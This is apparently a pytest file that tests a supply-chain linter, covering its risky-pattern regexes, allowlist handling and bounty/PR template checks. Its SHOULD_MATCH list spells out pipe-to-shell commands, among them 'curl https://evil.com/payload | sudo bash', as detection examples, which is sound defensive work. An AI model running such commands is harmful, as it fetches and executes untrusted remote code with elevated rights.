#!/usr/bin/env python3
"""
Tests for supply_chain_lint.py

Run: python -m pytest tests/test_supply_chain_lint.py -v
"""

import os
import sys
import tempfile
import shutil

# Add scripts to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "scripts"))

from supply_chain_lint import (
    RISKY_PATTERNS,
    load_allowlist,
    is_allowlisted,
    scan_risky_patterns,
    check_bounty_template,
    check_pr_template,
    REPO_ROOT,
)
import re


# ---------------------------------------------------------------------------
# Pattern detection tests
# ---------------------------------------------------------------------------


class TestRiskyPatterns:
    """Verify risky patterns are correctly detected."""

    SHOULD_MATCH = [
        "curl https://example.com/install.sh | bash",
        "curl -fsSL https://example.com/setup.sh | sh",
        "wget https://example.com/install.sh | bash",
        "wget -q https://example.com/setup.sh | sh",
        "curl https://evil.com/payload | sudo bash",
        "wget https://evil.com/payload | sudo sh",
        "curl https://example.com/script.py | python",
        "wget https://example.com/script.py | python",
        "curl https://example.com/script.pl | perl",
        "curl https://example.com/script.rb | ruby",
    ]

    SHOULD_NOT_MATCH = [
        "curl https://example.com/file.tar.gz -o file.tar.gz",
        "wget https://example.com/file.zip",
        "pip install pyyaml",
        "npm install express",
        "python setup.py install",
    ]

    def test_risky_lines_detected(self):
        """Each known-risky line should trigger at least one pattern."""
        for line in self.SHOULD_MATCH:
            matched = False
            for regex, _ in RISKY_PATTERNS:
                if re.search(regex, line, re.IGNORECASE):
                    matched = True
                    break
            assert matched, f"Expected match for: {line}"

    def test_safe_lines_not_detected(self):
        """Safe lines should not trigger any pattern."""
        for line in self.SHOULD_NOT_MATCH:
            for regex, desc in RISKY_PATTERNS:
                assert not re.search(regex, line, re.IGNORECASE), (
                    f"False positive on '{line}' — matched '{desc}'"
                )


# ---------------------------------------------------------------------------
# Allowlist tests
# ---------------------------------------------------------------------------


class TestAllowlist:
    def test_load_missing_file(self):
        """Missing allowlist returns empty defaults."""
        result = load_allowlist("/nonexistent/path.yml")
        assert result == {"files": [], "patterns": []}

    def test_load_real_allowlist(self):
        """The repo's allowlist loads without error."""
        path = os.path.join(REPO_ROOT, ".github", "supply-chain-allowlist.yml")
        if os.path.exists(path):
            result = load_allowlist(path)
            assert "files" in result
            assert "patterns" in result

    def test_file_allowlist(self):
        """Files in the allowlist are correctly skipped."""
        allowlist = {"files": ["scripts/supply_chain_lint.py"], "patterns": []}
        fpath = os.path.join(REPO_ROOT, "scripts", "supply_chain_lint.py")
        assert is_allowlisted(fpath, "curl | bash", allowlist)

    def test_pattern_allowlist(self):
        """Pattern-based allowlist entries work."""
        allowlist = {"files": [], "patterns": [r"Do not.*curl.*bash"]}
        assert is_allowlisted("/any/file", "Do not use curl | bash", allowlist)
        assert not is_allowlisted("/any/file", "curl | bash", allowlist)


# ---------------------------------------------------------------------------
# Template validation tests
# ---------------------------------------------------------------------------


class TestBountyTemplate:
    def test_bounty_template_exists(self):
        """Bounty template should exist in the repo."""
        path = os.path.join(
            REPO_ROOT, ".github", "ISSUE_TEMPLATE", "bounty.yml"
        )
        assert os.path.exists(path), "Bounty template not found"

    def test_bounty_template_has_required_fields(self):
        """Bounty template should have target, supply_chain, disclosure fields."""
        findings = check_bounty_template()
        assert len(findings) == 0, (
            f"Missing fields: {[f['issue'] for f in findings]}"
        )


class TestPRTemplate:
    def test_pr_template_exists(self):
        """PR template should exist in the repo."""
        path = os.path.join(
            REPO_ROOT, ".github", "PULL_REQUEST_TEMPLATE.md"
        )
        assert os.path.exists(path), "PR template not found"

    def test_pr_template_has_supply_chain_section(self):
        """PR template should have Supply-Chain Proof section."""
        findings = check_pr_template()
        assert len(findings) == 0, (
            f"Missing section: {[f['issue'] for f in findings]}"
        )


# ---------------------------------------------------------------------------
# Integration / dry-run test
# ---------------------------------------------------------------------------


class TestDryRun:
    def test_dry_run_exits_zero(self):
        """Dry run should always succeed."""
        import subprocess
        result = subprocess.run(
            [sys.executable, os.path.join(REPO_ROOT, "scripts", "supply_chain_lint.py"), "--dry-run"],
            capture_output=True, text=True
        )
        assert result.returncode == 0
        assert "DRY RUN" in result.stdout
